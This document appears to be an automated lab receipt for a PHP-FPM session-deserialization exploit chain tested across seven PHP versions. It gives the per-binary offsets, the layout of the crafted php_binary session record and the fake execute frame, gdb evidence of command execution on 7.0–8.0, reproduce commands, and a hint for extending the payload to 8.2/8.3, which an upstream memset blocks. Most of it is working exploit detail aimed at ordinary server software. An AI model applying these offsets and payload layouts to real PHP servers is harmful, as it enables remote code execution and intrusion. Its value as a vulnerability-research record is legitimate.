# PHP-FPM session-decode G2 lane — version matrix receipt

Receipt directory: `/tmp/opencode/research/vermatrix_20261022T004325Z`
Date: 2026-10-22 (UTC)
Operator: automated lab (private, single-worker FPM pools, ASLR disabled with
`setarch x86_64 -R`).

## 1. Verdict

| version | build | static offsets | live RCE (marker) | same worker | master untouched |
|---|---|---|---|---|---|
| 7.0.33 | OK (ET_EXEC) | derived | **yes** (`PASSTHRU_7033`) | yes | yes |
| 7.1.33 | OK (ET_EXEC) | derived | **yes** (`PASSTHRU_7133`) | yes | yes |
| 7.2.34 | OK (ET_EXEC) | derived | **yes** (`PASSTHRU_7234`) | yes | yes |
| 7.3.33 | OK (ET_EXEC) | derived | **yes** (`PASSTHRU_7333`) | yes | yes |
| 8.0.30 | OK (ET_EXEC) | derived | **yes** (`PASSTHRU_8030`) | yes | yes |
| 8.2.35 | OK (ET_EXEC) | derived | **blocked by upstream mitigation** | n/a | yes |
| 8.3.36 | OK (ET_EXEC) | derived | **blocked by upstream mitigation** | n/a | yes |

The 8.2.35/8.3.36 blocker is `php_basic_early_rinit()`, which memsets
`BG(unserialize)` at the start of every request. Source and live evidence are
in section 6; the lane cannot create a cross-request stale
`php_unserialize_data` there. No same-request staging primitive was found.

## 2. Builds

Recipe (all versions):

```sh
CFLAGS="-g -O1 -fno-omit-frame-pointer -fno-pie -DCOOKIE_SEEKER_USES_OFF64_T=1" \
LDFLAGS='-no-pie' ac_cv_what_readdir_r=POSIX \
  ./configure --prefix="$PWD/inst" --disable-all --enable-fpm --enable-session --without-pear
make -j8
```

All seven binaries are `ET_EXEC` (non-PIE), dynamically linked, built from the
official `php.net` release tarballs in `src/` (8.2.35/8.3.36 tarball hashes were
checked against php.net before use). `--disable-all` keeps the standard
`system`/`passthru` functions; no OpenSSL is needed for this lane.

| version | md5 | sha256 (tail) | size (bytes) | ELF | banner |
|---|---|---|---|---|---|
| 7.0.33 | `e2dbe259be9ded4834159faa01fc5c6f` | `…84ad3db689b39c77` | 15627832 | EXEC | PHP 7.0.33 (fpm-fcgi) (built: Oct 22 2026 02:45:26) |
| 7.1.33 | `a4188d663dfbcf85b1f8c0425dbd7500` | `…5fac19521061afa9` | 16424384 | EXEC | PHP 7.1.33 (fpm-fcgi) (built: Oct 22 2026 02:45:52) |
| 7.2.34 | `a0abf1001456796e77f0009fef95a80b` | `…9e623bd385cde6d9` | 17714656 | EXEC | PHP 7.2.34 (fpm-fcgi) (built: Oct 22 2026 02:46:20) |
| 7.3.33 | `d3c963068cb7d9f4089fc2fea0ccb1d9` | `…40609d80d3fc19e9` | 18193328 | EXEC | PHP 7.3.33 (fpm-fcgi) (built: Oct 22 2026 02:46:51) |
| 8.0.30 | `243c04f1a297ebef06e64a926d012a99` | `…84dcfab13ed7b964` | 23552272 | EXEC | PHP 8.0.30 (fpm-fcgi) (built: Oct 22 2026 02:47:19) |
| 8.2.35 | `f595cdbac28492a5f79df18e4d8f0bc4` | `…e4793d2bc3f79246` | 27350032 | EXEC | PHP 8.2.35 (fpm-fcgi) (built: Oct 22 2026 02:49:40) |
| 8.3.36 | `b57aeae53156e63aaa12141e9e2f82fd` | `…a53195975be3160c` | 27721160 | EXEC | PHP 8.3.36 (fpm-fcgi) (built: Oct 22 2026 02:48:01) |

Build note (8.2.35): the first configure (`CC=gcc` + `CFLAGS=-fno-pie`) left
`ZEND_MM_ALIGNMENT` undefined (`Zend/zend_alloc.h:30: #error`), so `make`
failed. Re-running configure with `CC='gcc -no-pie'` (log `log/cfg2-8.2.35.log`)
and rebuilding (`log/make2-8.2.35.log`) produced the binary above. This is a
configure-cache artifact, not a missing dependency.

## 3. Static offsets (all derived per binary, never assumed)

Serializer table order is `[0]=php_serialize, [1]=php, [2]=php_binary,
[3]=sentinel` in every build; the lab sets
`session.serialize_handler=php_binary`, so the hijacked slot is
`A = &ps_serializers[2].decode = ps_serializers + 0x40`, always 16-aligned.
`zif_passthru - zif_system == 0x10` in all seven binaries, but both symbols were
read independently from each ELF.

| version | ps_serializers | A = entry[2].decode | ps_globals | ps_ser_off | BG globals | BG(unser) off | zif_system | zif_passthru | Δ |
|---|---|---|---|---|---|---|---|---|---|
| 7.0.33 | 0x804de0 | 0x804e20 | 0x810e00 | 0x138 | 0x822cc0 | 0xdf0 | 0x4f3d0f | 0x4f3d1f | +0x10 |
| 7.1.33 | 0x820de0 | 0x820e20 | 0x82d200 | 0x128 | 0x83f0c0 | 0xdd0 | 0x4f7224 | 0x4f7234 | +0x10 |
| 7.2.34 | 0x847ea0 | 0x847ee0 | 0x85e5e0 | 0x128 | 0x870480 | 0xdd0 | 0x5024cf | 0x5024df | +0x10 |
| 7.3.33 | 0x852fa0 | 0x852fe0 | 0x854980 | 0x130 | 0x866820 | 0xdc0 | 0x513806 | 0x513816 | +0x10 |
| 8.0.30 | 0xe01160 | 0xe011a0 | 0xe02d60 | 0x130 | 0xe14bc0 | 0xd90 | 0x727679 | 0x727689 | +0x10 |
| 8.2.35 | 0xe01220 | 0xe01260 | 0xe03460 | 0x138 | 0xe152a0 | 0x350 | 0x746b10 | 0x746b20 | +0x10 |
| 8.3.36 | 0xe01280 | 0xe012c0 | 0xe03000 | 0x148 | 0xe14f40 | 0x358 | 0x74c0bf | 0x74c0cf | +0x10 |

| version | exec_data | arg1_off | type_off | key_len | unser_size | `last` / entries off | dtor layout |
|---|---|---|---|---|---|---|---|
| 7.0.33 | 88 | 0x60 | 0x68 | 112 | 32 | `last` @P+0x8, `last_dtor` @P+0x18 (external blocks) | old: data[1024]@B0, used_slots@B0+0x4000, next@B0+0x4008 |
| 7.1.33 | 80 | 0x50 | 0x58 | 96 | 40 | `last` @P+0x8, `last_dtor` @P+0x18 (external blocks) | old: data[1024]@B0, used_slots@B0+0x4000, next@B0+0x4008 |
| 7.2.34 | 80 | 0x50 | 0x58 | 96 | 40 | `last` @P+0x8, `last_dtor` @P+0x18 (external blocks) | old: data[1024]@B0, used_slots@B0+0x4000, next@B0+0x4008 |
| 7.3.33 | 72 | 0x50 | 0x58 | 96 | 40 | `last` @P+0x8, `last_dtor` @P+0x18 (external blocks) | old: data[1024]@B0, used_slots@B0+0x4000, next@B0+0x4008 |
| 8.0.30 | 80 | 0x50 | 0x58 | 96 | 8216 | entries @P+0x38 | new: used_slots@B0+0, next@B0+8, data@B0+0x10 (255 zvals) |
| 8.2.35 | 80 | 0x50 | 0x58 | 96 | 8224 | entries @P+0x40 | new: used_slots@B0+0, next@B0+8, data@B0+0x10 (255 zvals) |
| 8.3.36 | 80 | 0x50 | 0x58 | 96 | 8224 | entries @P+0x40 | new: used_slots@B0+0, next@B0+8, data@B0+0x10 (255 zvals) |

The old dtor (`7.0.33`–`7.3.33`) is `{ zval data[1024]; long used_slots; void *next; }`
(16400 bytes). The new dtor (`8.0.30`+) is
`{ long used_slots; void *next; zval data[255]; }` (4096 bytes). In 8.0 the
`entries` array starts at `P+0x38`; in 8.2/8.3 a `bool incomplete_classes_only`
sits at `P+0x38` and `entries` starts at `P+0x40` (live state confirms
`last = P+0x40` for 8.2/8.3 and `last = P+0x38` for 8.0).

## 4. Record geometry

`php_binary` record 1 is `<key_len byte><key bytes>i:<sink>;` — the integer is
the sink address (libc `system` for 7.0/7.1, `zif_passthru` for 7.2+) that
decode #1 writes into slot `A`. Record 2 is the string payload carrying the
fake P/B0 (or, for 7.0/7.1, only the K/var_entries patches). `Q` is the file
offset of the payload string. In the fake-P lane (7.2.34+) the command string
sits at `Q+0x118` and the fake-frame `arg1` pointer points there; in the
7.0/7.1 real-P lane the command is the record-1 key itself — the key length
byte is `0x74` (`'t'`) followed by `ouch …`, so the decode buffer *starts* with
`touch …;#` and no fake frame is needed.

| version | total | rec1_len | Q | p_idx | b_idx | used_slots file off | F_off | cmd_off |
|---|---|---|---|---|---|---|---|---|
| 7.0.33 | 131014 | 135 | 147 | — (real P) | 0x4f55 | 0x8fe8 | 403 | 427 |
| 7.1.33 | 131014 | 135 | 147 | — (real P) | 0x4f55 | 0x8fe8 | 403 | 427 |
| 7.2.34 | 163840 | 107 | 119 | 49209 | 130929 | 0x23fe8 | 375 | 399 |
| 7.3.33 | 163840 | 107 | 119 | 53305 | 130929 | 0x23fe8 | 375 | 399 |
| 8.0.30 | 131014 | 107 | 119 | 28529 | 40817 | 0x9fe8 | 375 | 399 |
| 8.2.35 | 131014 | 107 | 119 | 44913 | 57201 | 0xdfe8 | 375 | 399 |
| 8.3.36 | 131014 | 107 | 119 | 0xaf71 (planned) | 0xdf71 (planned) | 0xdfe8 (planned) | 375 | 399 |

## 5. Live proof

One private FPM pool per version (`127.0.0.1:28900`–`28906`), one worker,
`pm.max_requests=0`. The trigger is a plain GET to `trig.php` with
`session.auto_start=1`; the script body is
`session_write_close(); session_start();`, which gives decode #1 at RINIT,
flush T2, and decode #2 through the overwritten slot.

| version | trigger | total | shape/kfree | X1 | X2 | P | B0 | K (used_slots) | sink | marker | response pid | same worker | worker alive | master alive |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 7.0.33 | GET (auto_start) | 131014 | 0/0 | 0x7ffff7a65000 | 0x7ffff7a8d000 | 0x7ffff7a5e540 | 0x7ffff7a6a000 | -8796083741982 | libc `system` | `PASSTHRU_7033` | 1708976 | yes | yes | yes |
| 7.1.33 | GET (auto_start) | 131014 | 0/0 | 0x7ffff7a65000 | 0x7ffff7a8d000 | 0x7ffff7a55230 | 0x7ffff7a6a000 | -8796083734814 | libc `system` | `PASSTHRU_7133` | 1707659 | yes | yes | yes |
| 7.2.34 | GET (auto_start) | 163840 | 96/1 | 0x7ffff7a6e000 | 0x7ffff7ad4000 | 0x7ffff7a7a0c8 | 0x7ffff7a8e000 | -8796083734034 | `zif_passthru` | `PASSTHRU_7234` | 1693464 | yes | yes | yes |
| 7.3.33 | GET (auto_start) | 163840 | 96/1 | 0x7ffff7a6f000 | 0x7ffff7ada000 | 0x7ffff7a7c0c8 | 0x7ffff7a8f000 | -8796083731458 | `zif_passthru` | `PASSTHRU_7333` | 1695119 | yes | yes | yes |
| 8.0.30 | GET (auto_start) | 131014 | 0/0 | 0x7ffff7a6f000 | 0x7ffff7a92000 | 0x7ffff7a76000 | 0x7ffff7a79000 | -8796083353575 | `zif_passthru` | `PASSTHRU_8030` | 1696800 | yes | yes | yes |
| 8.2.35 | GET (auto_start) | 131014 | 0/0 | 0x7ffff7a6b000 | 0x7ffff7a8f000 | 0x7ffff7a76000 | 0x7ffff7a79000 | — | `zif_passthru` (never reached) | none | — | — | yes | yes |
| 8.3.36 | GET (auto_start) | 131014 | 0/0 | 0x7ffff7a6b000 | 0x7ffff7a8f000 | 0x7ffff7a76000 | 0x7ffff7a79000 | — | `zif_passthru` (never reached) | none | — | — | yes | yes |

`K = (A - B0)/16` for the old dtor and `K = (A - (B0+0x10))/16` for the new
dtor. The negative value is expected: `A` is a low `.data` address while
`B0` is in the high request heap. After the trigger, `ps_serializers[2].decode`
is the sink in all five successful versions (`ser2 = php_binary|<enc>|<sink>`),
whereas it was `php_binary|<enc>|0x…` before.

Note (7.0.33 / 7.1.33): the real-P lane never dereferences the second session
buffer (`F` is null), so the calibration `X2` in the table is unused; the
trigger run's decode-2 buffer was `0x7ffff7a86000` (`run2_final.txt`). For
7.2.34–8.0.30 the final run's decode-2 buffer equals the listed `X2`. The two
blocked rows show the addresses measured by `blocked_evidence.py`, not a
successful trigger.

Exact sink hits (gdb, `labs/<v>/phase/run2_final.txt`):

- 7.0.33 — `SYSTEM hit cmd=0x7ffff7a86018` →
  `"touch …/PASSTHRU_7033;#"`; the shell child was forked; marker created.
- 7.1.33 — `SYSTEM hit cmd=0x7ffff7a86018` →
  `"touch …/PASSTHRU_7133;#"`; marker created.
- 7.2.34 — `ZIF_PASSTHRU hit rdi=0x7ffff7ad4018 rsi=0x28000 rdx=0x2`;
  `PHP_EXEC_EX … numargs=1 arg1val=0x7ffff7ad418f arg1type=6`;
  `PHP_EXEC type=3 cmd=0x…41a7 "touch …/PASSTHRU_7234"`.
- 7.3.33 — `ZIF_PASSTHRU hit rdi=0x7ffff7ada018 rsi=0x28000 rdx=0x2`;
  `PHP_EXEC_EX … arg1val=0x7ffff7ada18f arg1type=6`;
  `PHP_EXEC type=3 cmd=0x…a1a7 "touch …/PASSTHRU_7333"`.
- 8.0.30 — `ZIF_PASSTHRU hit rdi=0x7ffff7a92018 rsi=0x1ffc6 rdx=0x2`;
  `PHP_EXEC_EX … arg1val=0x7ffff7a9218f arg1type=6`;
  `PHP_EXEC type=3 cmd=0x…21a7 "touch …/PASSTHRU_8030"`.

In every case the response PID equals the planted worker PID, the worker is
still alive after the shell child exits, and the master PID is unchanged
(`run2_result.json`: `same_worker`, `worker_alive`, `master_alive`).

## 6. 8.2.35 / 8.3.36: upstream mitigation

`php_basic_early_rinit()` is new in these two patch releases (absent from
8.2.34 and 8.3.35, present in later branches such as 8.4.27/8.5.12) and runs
from `php_request_startup()` before any request data is processed:

```c
/* 8.2.35 ext/standard/basic_functions.c:505, 8.3.36 :482 */
PHPAPI void php_basic_early_rinit(void)
{
    BG(serialize_lock) = 0;
    memset(&BG(serialize), 0, sizeof(BG(serialize)));
    memset(&BG(unserialize), 0, sizeof(BG(unserialize)));
    php_url_scanner_early_rinit();
}
```

Call site: `main/main.c:1816` (8.2.35) / `main/main.c:1829` (8.3.36), between
`zend_activate()` and `sapi_activate()`.

Live result: the plant request does leave `BG(unserialize).level=1` with a
valid `P`/`B0` at request end, but the next request starts with the globals
zeroed:

| version | after plant (request N) | trigger decode #1 (request N+1) | trigger decode #2 | ser2 after trigger | marker |
|---|---|---|---|---|---|
| 8.2.35 | level=1, P=0x7ffff7a76000, B0=0x7ffff7a79000 | level=0, bgdata=(nil) | level=0, bgdata=(nil) | 0x6f7df8 | no |
| 8.3.36 | level=1, P=0x7ffff7a76000, B0=0x7ffff7a79000 | level=0, bgdata=(nil) | level=0, bgdata=(nil) | 0x6faf14 | no |

Because `php_binary` decode #1 sees `level=0, bgdata=(nil)`, the `i:<sink>;`
record cannot call `var_tmp_var()` on the stale dtor array, so slot A is never
overwritten and decode #2 stays the original `ps_srlzr_decode_php_binary`.

Same-request alternative: a bailout is required to leave `level=1` (a normal
return runs `php_var_unserialize_destroy`), and the bailout terminates the
request before any later `session_start()` can run. A post-bailout session
buffer would also be allocated above `B0` under first-fit, so the file could
not patch `B0->used_slots`. No same-request staging primitive was found; the
versions are reported as mitigated, not as build failures.

The trigger attempts ran on the same single-worker pools and left the
worker/master alive: 8.2.35 `1710168/1710167`, 8.3.36 `1709991/1709990` (no
marker). The measured stale-state geometry is identical in both runs
(P=0x7ffff7a76000, B0=0x7ffff7a79000, X1=0x7ffff7a6b000, X2=0x7ffff7a8f000),
so the planned 8.3.36 fake-P row in section 4 mirrors 8.2.35's; none of it is
exercised because decode #2 is never reached. One known delta for anyone
continuing from here: the 8.0-layout fake-P pack writes at `P+0x38`, which is
`incomplete_classes_only` in 8.2/8.3 (`entries` starts at `P+0x40`), so the
pack needs a shift.

## 7. Version deltas (7.0–7.3 and shape changes)

- **7.0.33** — `zend_execute_data` is 88 bytes because the 7.0 struct still has
  `called_scope`; `arg1` is at `+0x60`, the type word at `+0x68`, frame key 112
  bytes. `php_unserialize_data` is 32 bytes (no `allowed_classes`). The dtor is
  the old 16400-byte layout. The 7.0 lane uses the real stale P and calls libc
  `system` directly: the record key length byte is `'t'` (0x74) and the key is
  `ouch …`, so the session buffer starts with the command string; no fake frame.
- **7.1.33** — `called_scope` is gone: 80-byte execute_data, `arg1 +0x50`,
  type `+0x58`, frame key 96. `php_unserialize_data` grows to 40 bytes
  (`allowed_classes`). Same real-P + libc `system` strategy.
- **7.2.34** — same 80/0x50/0x58/96 frame as 7.1, but the lane switches to a
  fake P placed in the session buffer and `zif_passthru` as the sink (the
  passthru wrapper passes exec type 3 into `php_exec_ex`). `ps_ser_off=0x128`,
  `BG(unserialize)=BG+0xdd0`.
- **7.3.33** — `zend_execute_data` shrinks to 72 bytes because the `literals`
  member is gone from the struct; the frame slot is still the same 5-zval
  position (`ceil(72/16)` = 5), so `arg1`/`type`/`key_len` stay
  `0x50`/`0x58`/96. `ps_ser_off` moves to `0x130` and `BG(unserialize)` to
  `BG+0xdc0`. Old dtor layout is unchanged.
- **8.0.30** — new dtor layout: the dtor array is `{used_slots, next, data[255]}`,
  `used_slots` at `B0+0`, data at `B0+0x10`, K therefore relative to `B0+0x10`.
  `entries` starts at `P+0x38` (`last = P+0x38`). Execute_data is 80 bytes.
- **8.2.35 / 8.3.36** — `php_unserialize_data` gains
  `bool incomplete_classes_only` at `+0x38`, so `entries` starts at `+0x40`
  (`last = P+0x40`); `unser_size` 8224. `ps_ser_off` is `0x138` / `0x148`;
  `BG(unserialize)` is `BG+0x350` / `BG+0x358`, re-derived per binary (the
  `php_core_globals` layout differs from 8.0). Execute_data remains 80 bytes.
  Both are blocked by the memset described in section 6.

Per-version one-line summaries:

- **7.0.33**: `sizeof(zend_execute_data)=88`; key_len 112; ps_ser_off 0x138; BG(unserialize) @ BG+0xdf0; old dtor (used_slots at B0+0x4000); real stale P (no fake P in file), libc `system` sink; Q=147, fake-P p_idx=— (real P), B0 b_idx=0x4f55, F_off=403.
- **7.1.33**: `sizeof(zend_execute_data)=80`; key_len 96; ps_ser_off 0x128; BG(unserialize) @ BG+0xdd0; old dtor (used_slots at B0+0x4000); real stale P (no fake P in file), libc `system` sink; Q=147, fake-P p_idx=— (real P), B0 b_idx=0x4f55, F_off=403.
- **7.2.34**: `sizeof(zend_execute_data)=80`; key_len 96; ps_ser_off 0x128; BG(unserialize) @ BG+0xdd0; old dtor (used_slots at B0+0x4000); fake P in session buffer, `zif_passthru` sink; Q=119, fake-P p_idx=49209, B0 b_idx=130929, F_off=375.
- **7.3.33**: `sizeof(zend_execute_data)=72`; key_len 96; ps_ser_off 0x130; BG(unserialize) @ BG+0xdc0; old dtor (used_slots at B0+0x4000); fake P in session buffer, `zif_passthru` sink; Q=119, fake-P p_idx=53305, B0 b_idx=130929, F_off=375.
- **8.0.30**: `sizeof(zend_execute_data)=80`; key_len 96; ps_ser_off 0x130; BG(unserialize) @ BG+0xd90; new dtor (used_slots at B0+0); fake P in session buffer, `zif_passthru` sink; Q=119, fake-P p_idx=28529, B0 b_idx=40817, F_off=375.
- **8.2.35**: `sizeof(zend_execute_data)=80`; key_len 96; ps_ser_off 0x138; BG(unserialize) @ BG+0x350; new dtor (used_slots at B0+0); fake-P record prepared, `zif_passthru` intended sink — blocked by `php_basic_early_rinit()` (section 6); Q=119, fake-P p_idx=44913, B0 b_idx=57201, F_off=375 (prepared, never triggered).
- **8.3.36**: `sizeof(zend_execute_data)=80`; key_len 96; ps_ser_off 0x148; BG(unserialize) @ BG+0x358; new dtor (used_slots at B0+0); fake-P layout planned (no record built), `zif_passthru` intended sink — blocked (section 6).

## 8. Reproduce

```sh
cd /tmp/opencode/research/vermatrix_20261022T004325Z
# build (already done): scripts/build_all.sh
# successful versions:
TOTAL=131014 SHAPE=0  KFREE=0 python3 scripts/run2.py 7.0.33 all
TOTAL=131014 SHAPE=0  KFREE=0 python3 scripts/run2.py 7.1.33 all
TOTAL=163840 SHAPE=96 KFREE=1 python3 scripts/run2.py 7.2.34 all
TOTAL=163840 SHAPE=96 KFREE=1 python3 scripts/run2.py 7.3.33 all
TOTAL=131014 SHAPE=0  KFREE=0 python3 scripts/run2.py 8.0.30 all
# mitigated versions:
python3 scripts/blocked_evidence.py 8.2.35 8.3.36
```

`run2.py` is two-phase: the calibration request measures the two session
buffers `X1`/`X2` with a harmless `php_binary` session of the configured
`TOTAL` size (`131014`, or `163840` for the two shaped runs); the final phase
starts a fresh worker, plants the stale `BG(unserialize)`, reads `P`/`B0`/`last`,
builds the record with the measured `X1`/`X2`, and triggers the plain GET.
`shape.py` and `drv.py` control the pre-plant heap shape (`shape=96, kfree=1`
frees a 40-byte bin-4 block, which places `P` inside the 163840-byte buffer for
7.2/7.3). `mkrec.py` builds both the record and the fake frame; in the fake-P
lane the `F` pointer is `X2+0x18+Q+0x100` (`F` is null for the 7.0/7.1 real-P
lane).

## 9. Evidence index

| path | contents |
|---|---|
| `static.json`, `static.tsv` | per-binary symbols, serializer table, struct/frame facts |
| `log/static-*.gdb.txt` | raw gdb derivation of every offset |
| `labs/<v>/phase/run2_result.json` | run2 results (five successful markers; the 8.2.35 attempt has `marker:false`) |
| `labs/<v>/phase/mkrec_r*.json` | record metadata: `Q`, `p_idx`/`b_idx`, `K`, `F`, command |
| `labs/<v>/phase/run2_final.txt` | gdb hits for the successful triggers |
| `labs/<v>/phase/blocked_evidence.json` | plant→trigger evidence for 8.2/8.3 |
| `labs/<v>/req/requests.log` | per-request ledger with PIDs and budgets |
| `evidence/src-*.txt` | mitigation source snippets and absence proof |
| `binaries.sha256`, `tarballs.sha256` | binary and source hashes |
| `SHA256SUMS` | manifest over README, scripts, evidence, logs and lab phase artifacts (build/, src/, session files and request bodies are covered separately or excluded) |

Limitations: addresses are absolute only because the labs disable ASLR
(`setarch -R`); the exploit lane itself does not need OpenSSL or any extension
beyond `session` and the standard `system`/`passthru` functions. All labs are
private and use unique ports 28900–28906; shared services were not touched.

---

Generated by `scripts/mkreceipt.py` from the recorded JSON/TSV data.

---

## Repository curation note (this copy)

The public copy keeps the report, `static.json`/`static.tsv`, `binaries.sha256`, the gdb
script, `scripts/`, `evidence/`, `log/` and the per-version `labs/` trees (configs,
sessions, phase, req, logs). Two source trees are environment, not evidence, and are not
included:

* `build/` — **2.1 GB** of compiler build directories;
* `src/` — **105 MB** of downloaded PHP release tarballs and extracted sources.

The seven built `php-fpm` binaries are likewise absent; their md5/sha256 values are in this
README and in `binaries.sha256`. `SHA256SUMS` was regenerated for the curated set (it covers
every file in this directory except itself), so `sha256sum -c SHA256SUMS` passes here. The
source receipt's manifest remains the authority for the excluded build/src trees; its only
delta against this copy is this README (the note below was added during curation).
